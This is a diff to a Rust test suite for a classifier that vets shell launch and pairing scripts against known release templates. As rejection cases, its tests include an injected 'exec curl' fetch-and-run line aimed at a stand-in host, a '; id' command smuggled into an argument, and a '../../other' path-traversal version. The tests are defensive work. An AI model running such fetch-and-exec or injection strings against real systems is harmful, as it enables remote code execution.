@@ -64,7 +64,37 @@ fn recognizes_release_templates_without_executing_their_downloaders() {
 }
 
 #[test]
-fn rejects_modified_shell_unknown_commands_dev_runners_and_oversized_scripts() {
+fn accepts_desktop_serialization_and_installer_changes_for_the_same_typed_request() {
+    // Release builds stringify JS helpers and can change downloader implementation
+    // independently of the launch/pairing protocol. None of that code is executed.
+    let variant = |script: String| {
+        script
+            .replace("T3_NODE_SCRIPT_PATH=''", "T3_NODE_SCRIPT_PATH=\"\"")
+            .replace("T3_ARCHIVE_VERSION='0.0.45'", "T3_ARCHIVE_VERSION=\"0.0.45\"")
+            .replace(
+                "t3_fetch \"$T3_RELEASE_BASE_URL/v$T3_ARCHIVE_VERSION/SHA256SUMS\" \"$T3_STAGING/SHA256SUMS\" 30",
+                "echo 'installer must never execute' >&2; exit 99",
+            )
+            .lines()
+            .map(|line| format!("  {line}\r\n"))
+            .collect::<String>()
+    };
+    assert_eq!(
+        compatibility::classify(
+            "sh -l -s -- '0123456789abcdef'",
+            variant(launch("0.0.45")).as_bytes()
+        )
+        .unwrap(),
+        Operation::Launch("0.0.45".into())
+    );
+    assert_eq!(
+        compatibility::classify("sh -s", variant(pairing("0.0.45")).as_bytes()).unwrap(),
+        Operation::Pair("0.0.45".into())
+    );
+}
+
+#[test]
+fn rejects_unknown_requests_dev_runners_ambiguous_versions_and_oversized_scripts() {
     let script = launch("0.0.45");
     for bad in [
         format!("{script}\nexec curl https://invalid.example/installer\n"),
@@ -75,11 +105,23 @@ fn rejects_modified_shell_unknown_commands_dev_runners_and_oversized_scripts() {
         ),
         launch("../../other"),
         launch("00.0.45"),
+        script.replace(
+            "T3_ARCHIVE_VERSION='0.0.45'",
+            "T3_ARCHIVE_VERSION='0.0.45'\nT3_ARCHIVE_VERSION='0.0.46'",
+        ),
+        script.replace(
+            "T3_RUNTIME_DIR=\"$HOME/.t3/runtime/versions/$T3_ARCHIVE_VERSION\"",
+            "T3_RUNTIME_DIR='/tmp/other'",
+        ),
+        "set -eu\nT3_ARCHIVE_VERSION='0.0.45'\ncurl https://invalid.example/installer\n".into(),
     ] {
         assert!(compatibility::classify("sh -l -s -- 0123456789abcdef", bad.as_bytes()).is_err());
     }
     assert!(compatibility::classify("bash -s", script.as_bytes()).is_err());
     assert!(compatibility::classify("sh -l -s -- ../../other", script.as_bytes()).is_err());
+    assert!(
+        compatibility::classify("sh -l -s -- '0123456789abcdef'; id", script.as_bytes()).is_err()
+    );
     assert!(
         compatibility::classify("sh -s", &vec![b' '; compatibility::MAX_SCRIPT_BYTES + 1]).is_err()
     );
